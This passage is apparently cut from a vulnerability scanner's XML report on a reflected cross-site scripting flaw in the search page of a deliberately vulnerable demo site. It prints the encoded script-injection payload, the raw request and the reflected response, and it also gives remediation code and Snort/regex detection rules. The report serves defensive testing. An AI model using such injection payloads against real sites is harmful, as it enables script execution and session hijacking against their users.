searchFor=12345%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%35%36%38%36%32%29%3c%2f%73%43%72%49%70%54%3e&goButton=go]]></AttackHTTPRequest><VulnerabilityID>5649</VulnerabilityID><Severity>4</Severity><Name>Cross-Site Scripting</Name><Classifications><Classification kind="CWE" identifier="CWE-80" href="http://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="Cross-Site Scripting: Reflected" href="https://vulncat.fortify.com/">Cross-Site Scripting: Reflected</Classification></Classifications><DetectionSelection><Location offset="2338" length="29" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<drc_fortify /><hp-img src="xss.rgc" /><br /><drc_xssrf />A Cross-Site Scripting (XSS) vulnerability was detected in the web application. Cross-Site Scripting occurs when dynamically generated web pages display user input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. In this instance, the web application was vulnerable to an automatic payload, meaning the user simply has to visit a page to make the malicious scripts execute. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on end user systems. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />
Cross-Site Scripting(XSS) happens when user input from a web client is immediately included via server-side scripts in a dynamically generated web page. Reflected XSS is specifically considered critical when malicious payload can be embedded in a URL (e.g. in query strings of GET requests). An attacker can trick a victim, via phishing attack, to click on a link with vulnerable input which has been altered to include attack code and then sent to the legitimate server. The injected code is then reflected back to the user's browser which executes it. <br /><br />

The implications of successful Cross-Site Scripting attacks are:

<ul><li>Account hijacking -  An attacker can hijack the user's session before the session cookie expires and take actions with the privileges of the user who accessed the URL, such as issuing database queries and viewing the results. </li><li>Malicious script execution - Users can unknowingly execute JavaScript, VBScript, ActiveX, HTML, or even Flash content that has been inserted into a dynamically generated page by an attacker. 

</li><li>Worm propagation - With Ajax applications, XSS can propagate somewhat like a virus. The XSS payload can autonomously inject itself into pages, and easily re-inject the same host with more XSS, all of which can be done with no hard refresh. Thus, XSS can send multiple requests using complex HTTP methods to propagate itself invisibly to the user.
</li><li>Information theft - Via redirection and fake sites, attackers can connect users to a malicious server of the attacker's choice and capture any information entered by the user.</li><li>	Denial of Service - Often by utilizing malformed display requests on sites that contain a Cross-Site Scripting vulnerability, attackers can cause a denial of service condition to occur by causing the host site to query itself repeatedly . </li><li>Browser Redirection - On certain types of sites that use frames, a user can be made to think that he is in fact on the original site when he has been redirected to a malicious one, since the URL in the browser's address bar will remains the same. This is because the entire page isn't being redirected, just the frame in which the JavaScript is being executed is redirected. </li><li>	Manipulation of user settings - Attackers can change user settings for nefarious purposes. </li><li>Bypass Content-Security-Policy protection  -  Attackers can inject a malformed tag formation, known as dangling tag injection, which in some cases allows injected script to reuse valid nonce on the page and bypass script source restriction. Additionally dangling tag injection can be used to steal sensitive information embedded in HTML response if browser is able to make a request to the injected link. </li><li>Base tag injection: Attacker can cause relative links on a page to load from a different domain by modifying the base URL for the page via base tag injection.</li><li>Link prefetch injection: While unable to execute script, attackers can use link tag with rel=prefetch that will make browsers pre-fetch the specified link even though it is never rendered and rejected subsequently due to web application enforced cross-site policy (e.g. CSP protections).</li><li>Edge side includes (ESI) Injection - ESI  is a markup language used in various HTTP devices, such as reverse proxies and load balancers, that are positioned between client and server.  An attacker can inject ESI markup to perform critical attacks such as cross-site scripting and HTTPOnly cookie protection bypass. </li></ul>]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />

View the attack string included with the request to check what to search for in the response. For instance, if "(javascript:alert('XSS')"  is submitted as an attack (or another scripting language), it will also appear as part of the response.  This indicates that the web application is taking values from the HTTP request parameters and using them in the HTTP response without first removing potentially malicious data.


The response can be viewed in “Web Browser” view in the Vulnerability pane to see the injected popup events in action. Events requiring user interaction (e.g. onmouseover or onclick events) can be triggered by performing the corresponding action (e.g. clicking the injected link). 



Injection with numeric string in src, or href, attributes indicates that the site is vulnerable to script include or content exfiltration. These can be verified by repeating the request in a browser and intercepting originating network traffic in a web proxy.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />
Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. When validating user input, 

verify that it matches the strictest definition of valid input possible. For example, if a certain parameter is supposed to be a number, attempt 

to convert it to a numeric data type in your programming language. <br /><br /><b>PHP:</b> intval("0".$_GET['q']);   <br /><br /><b>ASP.NET:</b> 

int.TryParse(Request.QueryString["q"], out val); <br /><br />

The same applies to date and time values, or anything that can be converted to a stricter type before being used. When accepting other types of 

text input, make sure the value matches either a list of acceptable values (white-listing), or a strict regular expression. If at any point the 

value appears invalid, do not accept it. Also, do not attempt to return the value to the user in an error message. <br /><br />

Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. 

These should be used to sanitize all input before it is displayed to the client. <br /><br /><b>PHP:</b>  string htmlspecialchars (string string 

[, int quote_style])<br /><br /><b>ASP.NET:</b> Server.HTMLEncode (strHTML String)



<br /><br />

When reflecting values into JavaScript or another format, make sure to use a type of encoding that is appropriate. Encoding data for HTML is not 

sufficient when it is reflected inside of a script or style sheet. For example, when reflecting data in a JavaScript string, make sure to encode 

all non-alphanumeric characters using hex (\xHH) encoding.<br /><br />

If you have JavaScript on your page that accesses unsafe information (like location.href) and writes it to the page (either with document.write, 

or by modifying a DOM element), make sure you encode data for HTML before writing it to the page. JavaScript does not have a built-in function to 

do this, but many frameworks do. If you are lacking an available function, something like the following will handle most cases:<br /><br />

s = s.replace(/&amp;/g,'&amp;amp;').replace(/"/i,'&amp;quot;').replace(/&lt;/i,'&amp;lt;').replace(/&gt;/i,'&amp;gt;').replace(/'/i,'&amp;apos;')


<br /><br />

Ensure that you are always using the right approach at the right time. Validating user input should be done as soon as it is received. Encoding 

data for display should be done immediately before displaying it.

<b><br /><br />


For Security Operations:</b><br /><br />

Server-side encoding, where all dynamic content is first sent through an encoding function where Scripting tags will be replaced with codes in the 

selected character set, can help to prevent Cross-Site Scripting attacks. <br /><br />

Many web application platforms and frameworks have some built-in support for preventing Cross-Site Scripting. Make sure that any built-in 

protection is enabled for your platform. In some cases, a misconfiguration could allow Cross-Site Scripting. In ASP.NET, if a page's 

EnableViewStateMac property is set to False, the ASP.NET view state can be used as a vector for Cross-Site Scripting. <br /><br />

An IDS or IPS can also be used to detect or filter out XSS attacks. Below are a few regular expressions that will help detect Cross-Site 

Scripting. <br /><br /><b>Regex for a simple XSS attack:</b><br />
/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/ix <br /><br />

The above regular expression would be added into a new Snort rule as follows: <br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"NII Cross-Site Scripting attempt"; flow:to_server,established; 

pcre:"/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/i"; classtype:Web-application-attack; sid:9000; rev:5;) <br /><br /><b>Paranoid regex for 

XSS attacks:</b><br />
/((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/I <br /><br />

This signature simply looks for the opening HTML tag, and its hex equivalent, followed by one or more characters other than the new line, and then 

followed by the closing tag or its hex equivalent. This may end up giving a few false positives depending upon how your web application and web 

server are structured, but it is guaranteed to catch anything that even remotely resembles a Cross-Site Scripting attack.

<br /><br /><b>For QA:</b><br /><br />


Fixes for Cross-Site Scripting defects will ultimately require code based fixes. Read the the following links for more information 

about manually testing your application for Cross-Site Scripting.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><br /><b>OWASP Cross-Site Scripting Information</b><br /><a href="https://www.owasp.org/index.php/XSS">https://www.owasp.org/index.php/XSS</a><br /><br /><b>CERT</b><br /><a href="http://www.cert.org/advisories/CA-2000-02.html">http://www.cert.org/advisories/CA-2000-02.html</a><br /><br /><b>Apache</b><br /><a href="http://httpd.apache.org/info/css-security/apache_specific.html">http://httpd.apache.org/info/css-security/apache_specific.html</a><br /><br /><b>SecurityFocus.com</b><br /><a href="http://www.securityfocus.com/infocus/1768 ">http://www.securityfocus.com/infocus/1768 </a>]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[Cross-Site Scripting occurs when dynamically generated web pages display input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, utilizing client-side validation of user supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[When successfully exploited, Cross-Site Scripting gives an attacker a method of taking control of the interaction between a user and a web site. On a simple site composed of static content, this might only lead to changing how pages display to a specific user. When the site is capable of accepting user input, such as login information, or allows users to make choices with real world implications such as transferring funds or accessing private data, Cross-Site Scripting presents its most serious threat. The most significant danger from a successful Cross-Site Scripting attack is that an attacker will be able to emulate the credentials of an actual user by gaining access to a user’s session cookie, thereby hijacking the user session and taking over the account. The FDIC has recently indicated that unauthorized access to checking accounts is the fastest growing form of identity theft. More often than not, these instances of account hijacking are due to the presence of Cross-site scripting vulnerabilities. When an attacker gains control on the user’s end, it then often becomes unnecessary to break into the server. By that point, he already has the means to acquire the information he needs.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[To carry out a Cross-Site Scripting attack, an attacker will create a URL that takes advantage of a Cross-Site Scripting flaw. The attacker must then find some way of getting a victim to visit this URL. This can be done in many ways, ranging from getting it listed in a search engine to exploiting weaknesses in mail clients that allow scripted content to be executed. Once the victim has used the Cross-Site Scripting URL, the attacker's malicious code will be executed on his or her system.  In other words, there is a lot of effort required up-front for these attacks to be successful.  However, the potential payoff makes that effort worthwhile more often than not.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed quickly, especially if the application is already in production.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. Validation can be done using standard ASP.NET Validation controls, or directly in your code. Do not attempt to sanitize input by removing script strings or characters, simply reject it. Always use as strict a pattern as you can possibly allow.<br /><br />
Encoding of output insures that any scriptable content is properly encoded for HTML before being sent to the client. This is done with the function HttpUtility.HtmlEncode, as shown in the following Label control sample:<br /><br />
	Label2.Text = HttpUtility.HtmlEncode(input)
<br /><br />Be sure to consider all paths that user input takes through your application. For instance, if data is entered by the user, stored in a database, and then redisplayed later, you must make sure it is properly encoded each time it is retrieved.If you must allow free-format text input, such as in a message board, and you wish to allow some HTML formatting to be used, you can handle this safely by explicitly allowing only a small list of safe tags. Here is an example of how to do this safely:<br /><br />
C# Example:<br /><br />
            StringBuilder sb = new StringBuilder(<br />
                HttpUtility.HtmlEncode(input)); <br />
            sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;"); <br />
            sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;"); <br />
            Response.Write(sb.ToString());<br /><br />

VB.NET Example: <br /><br />
        Dim sb As StringBuilder = New StringBuilder( _ <br />
                HttpUtility.HtmlEncode(input)) <br />
        sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;") <br />
        sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;") <br />
        Response.Write(sb.ToString())<br /><br />

The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure what is being returned is what is expected, and is valid. </li><li>Use client-side validation when adding extra functionality to user input checking in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered " &lt;script&gt;alertdocumentcookie( 'aaa') &lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response, so that they cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms as opposed to single-factor authentication. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the web, or given to you by an acquaintance) for use in your own code. </li></ul>
Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. These should be used to sanitize all input before displayed to the client. 
<br /><br />
ASP / ASP.NET: Server.HTMLEncode (strHTML String)<br /><br />]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the Web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure the data being returned is what is expected, and is valid. </li><li>When adding extra functionality to user-input checking, use client-side validation in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user-supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered "&lt;script&gt;alertdocumentcookie('aaa')&lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response. Encoding ensures that the characters cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms, such as requiring a token and password, as opposed to single-factor authentication, such as requiring only a password. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the Web or given to you by an acquaintance) for use in your own code. </li></ul>
The Java language does not have a built-in method to convert the value of the input variable into correct, non-interpretable HTML. The following code samples show two different ways of writing a utility method to sanitize all user input before displaying it back to the client. <br /><br /><br />
public static String HTMLEncode(String aTagFragment){ <br /><br />
  //make sure you replace &amp; first<br />
  aTagFragment = aTagFragment.replaceAll("&amp;", "&amp;amp;"); <br />
  aTagFragment = aTagFragment.replaceAll("&lt;", "&amp;lt;"); <br />
  aTagFragment = aTagFragment.replaceAll("&gt;", "&amp;gt;"); <br />
  aTagFragment = aTagFragment.replaceAll("\"", "&amp;quot;"); <br />
  aTagFragment = aTagFragment.replaceAll("'", "&amp;#39;"); <br />
  //replace backslash ‘\’ character<br />
  aTagFragment = aTagFragment.replaceAll("\\\\", "&amp;#92;"); <br /><br />
  return aTagFragment; <br />
}<br /><br />
public static String HTMLEncode(String aTagFragment){ <br />
  final StringBuffer result = new StringBuffer();<br />
  final StringCharacterIterator iterator = new StringCharacterIterator(aTagFragment); <br />
  char character = iterator.current();<br />
  while (character != StringCharacterIterator.DONE ){ <br />
   		if (character == '&lt;') { <br />
   			result.append("&amp;lt;"); <br />
   		} <br />
   		else if (character == '&gt;') { <br />
   			result.append("&amp;gt;"); <br />
   		} <br />
   		else if (character == '\"') { <br />
   			result.append("&amp;quot;"); <br />
   		} <br />
   		else if (character == '\'") { <br />
   			result.append("&amp;#39;"); <br />
   		} <br />
   		else if (character == '\\') { <br />
   			result.append("&amp;#92;"); <br />
   		} <br />
   		else if (character == '&amp;') { <br />
   			result.append("&amp;amp;"); <br />
   		} <br />
   		else { <br />
   			//the char is not a special one <br />
   			//add it to the result as is <br />
   			result.append(character); <br />
   		} <br />
   		character = iterator.next();<br />
   	} <br />
   	return result.toString();<br />
}]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection></Issue></Issues><RawRequest id="E6FADCDC4407BE5161D063B2AF83DC3B"><![CDATA[POST /search.php HTTP/1.1
Referer: http://php.vulnweb.com/index.bak
Content-Type: application/x-www-form-urlencoded
Content-Length: 114
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="E6FADCDC4407BE5161D063B2AF83DC3B";PSID="4AB6FA19F6334A625707397B312A1F8D";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="searchFor";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="12345%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2535%2536%2538%2536%2532%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="42";tt="40";
X-RequestManager-Memo: sid="33";smi="0";sc="1";ID="6d45ee81";
X-Request-Memo: ID="1ed5f0b4";sc="1";tid="42";
Cookie: CustomCookie=WebInspect0

searchFor=12345%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%35%36%38%36%32%29%3c%2f%73%43%72%49%70%54%3e&goButton=go]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:57:39 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 4803

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>search</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>searched for: 12345<sCrIpT>alert(56862)</sCrIpT></h2></div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="E6FADCDC4407BE5161D063B2AF83DC3B"><Method>POST</Method><Path>/</Path><File>search</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData>searchFor=12345%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%35%36%38%36%32%29%3c%2f%73%43%72%49%70%54%3e&amp;goButton=go</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/index.bak</Value></Header><Header><Name>Content-Type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Content-Length</Name><Value>114</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="E6FADCDC4407BE5161D063B2AF83DC3B";PSID="4AB6FA19F6334A625707397B312A1F8D";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="searchFor";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="12345%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2535%2536%2538%2536%2532%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="42";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="33";smi="0";sc="1";ID="6d45ee81";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="1ed5f0b4";sc="1";tid="42";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>search</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>searched for: 12345<sCrIpT>alert(56862)</sCrIpT></h2></div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
